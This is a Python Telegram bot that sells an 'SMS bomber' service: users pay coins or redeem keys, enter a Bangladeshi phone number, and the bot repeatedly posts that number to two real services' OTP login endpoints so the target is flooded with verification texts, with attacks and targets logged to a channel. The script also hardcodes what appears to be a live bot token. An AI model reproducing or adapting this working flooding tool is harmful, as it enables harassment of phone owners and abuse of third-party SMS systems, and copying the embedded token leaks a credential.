import telebot
import requests
import json
import os
import time
import threading
import random
import uuid
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস হ্যান্ডলার ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# ডেটাবেস লোড
users = load_db('users.json')
keys = load_db('keys.json')

# --- ইউটিলিটি ফাংশনস ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"✨ **System Log**\n⏰ {datetime.now().strftime('%d-%m %H:%M:%S')}\n━━━━━━━━━━━━━━\n{text}")
    except: pass

def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def update_user(user):
    uid = str(user.id)
    if uid not in users:
        # নতুন ইউজার ডিফল্ট কয়েন পাবে একবারই, আইডি একবার ডাটাবেসে থাকলে আর পাবে না।
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active",
            "coins": 50,
            "sent": 0
        }
        save_db('users.json', users)
        send_log(f"👤 **New User Registered**\nName: {user.first_name}\nID: `{uid}`")
    return users[uid]

# --- এনিমেশন ইফেক্ট ---
def loading_effect(chat_id, message_id, final_text):
    frames = ["⏳ Processing.", "⏳ Processing..", "⏳ Processing..."]
    for _ in range(2):
        for frame in frames:
            try:
                bot.edit_message_text(frame, chat_id, message_id)
                time.sleep(0.3)
            except: pass
    bot.edit_message_text(final_text, chat_id, message_id)

# --- স্টার্ট কমান্ড ---
@bot.message_handler(commands=['start'])
def start(message):
    u = update_user(message.from_user)
    
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Access Denied!**\n\nPlease join our official channel to use this bot.", reply_markup=markup)
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🚀 Start Attack", callback_data="bomb")
    btn2 = types.InlineKeyboardButton("👤 Profile", callback_data="profile")
    btn3 = types.InlineKeyboardButton("🔑 Use Key", callback_data="use_key")
    btn4 = types.InlineKeyboardButton("⚙️ Admin Help", callback_data="admin_help")
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_photo(message.chat.id, LOGO_URL, caption=f"👋 **Welcome, {u['name']}!**\n\n💰 Coins: `{u['coins']}`\n🌟 Status: `{u['status']}`\n🔥 Total Sent: `{u['sent']}`\n\n_Choose an option below:_ ", reply_markup=markup)

# --- এডমিন কমান্ডস ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    text = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - চেক সিস্টেম ওভারভিউ\n"
        "👥 `/users` - সকল ইউজার লিস্ট দেখা\n"
        "⚙️ `/setstatus [ID] [Status]` - (Blocked/Lifetime/Active)\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড করা\n"
        "🔑 `/gen [Amount]` - রিচার্জ কি জেনারেট করা\n"
        "📢 `/broadcast [Msg]` - সবাইকে মেসেজ দেওয়া"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    active_keys = len([k for k in keys if keys[k]['status'] == 'unused'])
    bot.reply_to(message, f"📊 **System Stats**\n\nTotal Users: `{total_u}`\nActive Keys: `{active_keys}`\nBot Status: `Online 🟢`")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID: return
    text = "👥 **Total User List:**\n\n"
    for uid, d in users.items():
        text += f"• {d['name']} | `{uid}` | {d['status']}\n"
        if len(text) > 3500:
            bot.send_message(message.chat.id, text)
            text = ""
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['setstatus'])
def set_status(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, stat = message.text.split()
        if tid in users:
            users[tid]['status'] = stat
            save_db('users.json', users)
            bot.reply_to(message, f"✅ User `{tid}` is now `{stat}`")
            send_log(f"🛠 **Status Updated**\nUser: `{tid}`\nNew Status: `{stat}`")
    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Status]`")

@bot.message_handler(commands=['addcoins'])
def add_coins(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        if tid in users:
            users[tid]['coins'] += int(amt)
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Added {amt} coins to `{tid}`")
    except: bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")

@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amt = int(message.text.split()[1])
        key = "DU-" + str(uuid.uuid4()).upper()[:8]
        keys[key] = {"amount": amt, "status": "unused"}
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key Generated!**\n\nKey: `{key}`\nValue: `{amt} Coins`\n\n_Send this key to the user._")
    except: bot.reply_to(message, "Usage: `/gen [Amount]`")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    msg_text = message.text.replace("/broadcast ", "")
    sent_to = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **Broadcast Message**\n\n{msg_text}")
            sent_to += 1
        except: pass
    bot.reply_to(message, f"✅ Sent to {sent_to} users.")

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def handle_calls(call):
    uid = str(call.from_user.id)
    u_data = users.get(uid)

    if call.data == "profile":
        text = (f"👤 **User Profile**\n━━━━━━━━━━━━━━\n"
                f"Name: `{u_data['name']}`\n"
                f"ID: `{uid}`\n"
                f"Coins: `{u_data['coins']}`\n"
                f"Status: `{u_data['status']}`\n"
                f"Total Sent: `{u_data['sent']}`")
        bot.send_message(call.message.chat.id, text)

    elif call.data == "use_key":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter your Recharge Key:**")
        bot.register_next_step_handler(msg, process_key)

    elif call.data == "admin_help":
        bot.answer_callback_query(call.id, "Contact Admin: @YourAdminUsername", show_alert=True)

    elif call.data == "bomb":
        if u_data['status'] == "Blocked":
            bot.send_message(call.message.chat.id, "🚫 **Account Blocked!**\n\nPlease contact admin to unblock.")
            return
        if u_data['status'] != "Lifetime" and u_data['coins'] < 5:
            bot.send_message(call.message.chat.id, "⚠️ **Insufficient Coins!**\n\nYou need at least 5 coins for an attack.")
            return
        
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_bomb_amount)

# --- কী প্রসেসিং ---
def process_key(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys and keys[key]['status'] == 'unused':
        amt = keys[key]['amount']
        users[uid]['coins'] += amt
        keys[key]['status'] = 'used'
        save_db('users.json', users)
        save_db('keys.json', keys)
        bot.reply_to(message, f"✅ **Success!**\n`{amt}` coins added to your account.")
        send_log(f"🔑 **Key Used**\nUser: `{uid}`\nKey: `{key}`\nAmt: `{amt}`")
    else:
        bot.reply_to(message, "❌ Invalid or Expired Key!")

# --- বোম্বিং লজিক ---
def get_bomb_amount(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Limit: 50):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.reply_to(message, "❌ Invalid Number! Please try again.")

def start_attack(message, num):
    try:
        count = int(message.text)
        if count > 50: count = 50
        uid = str(message.from_user.id)
        
        # প্রতিটি রিকোয়েস্টের জন্য ৫ কয়েন চার্জ (লাইফটাইম বাদে)
        if users[uid]['status'] != 'Lifetime':
            users[uid]['coins'] -= 5
            save_db('users.json', users)

        p_msg = bot.send_message(message.chat.id, "🚀 **Initializing Attack...**")
        threading.Thread(target=bomb_engine, args=(uid, num, count, p_msg)).start()
    except: bot.reply_to(message, "❌ Invalid input.")

def bomb_engine(uid, num, count, p_msg):
    success = 0
    apis = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp"
    ]
    
    for i in range(1, count + 1):
        try:
            # আল্ট্রা ফাস্ট রিকোয়েস্ট
            r = requests.post(random.choice(apis), json={"number": "+88"+num, "phone": num}, timeout=3)
            if r.status_code == 200: success += 1
            
            # এনিমেশন এবং প্রগ্রেস আপডেট
            if i % 5 == 0:
                bar = "▓" * (i // 5) + "░" * ((count - i) // 5)
                bot.edit_message_text(f"🚀 **Attack in Progress**\nTarget: `{num}`\nProgress: `[{bar}]` {i}/{count}", p_msg.chat.id, p_msg.message_id)
            time.sleep(0.1)
        except: pass

    users[uid]['sent'] += success
    save_db('users.json', users)
    
    # শেষ রিপোর্ট
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Attack Again", callback_data="bomb"))
    
    final_text = (f"✅ **Attack Finished!**\n━━━━━━━━━━━━━━\n"
                  f"📱 Target: `{num}`\n"
                  f"📤 Sent: `{success}`\n"
                  f"💰 Coins Left: `{users[uid]['coins']}`\n"
                  f"👤 User: `{users[uid]['name']}`")
    
    bot.edit_message_text(final_text, p_msg.chat.id, p_msg.message_id, reply_markup=markup)
    send_log(f"🔥 **Attack Report**\nTarget: `{num}`\nSent: `{success}`\nBy: `{uid}`")

# --- বট স্টার্ট ---
if __name__ == "__main__":
    print("DU ModZ SMS Bot is booting up...")
    send_log("✅ **Bot is now Online & Ready!**")
    bot.infinity_polling()
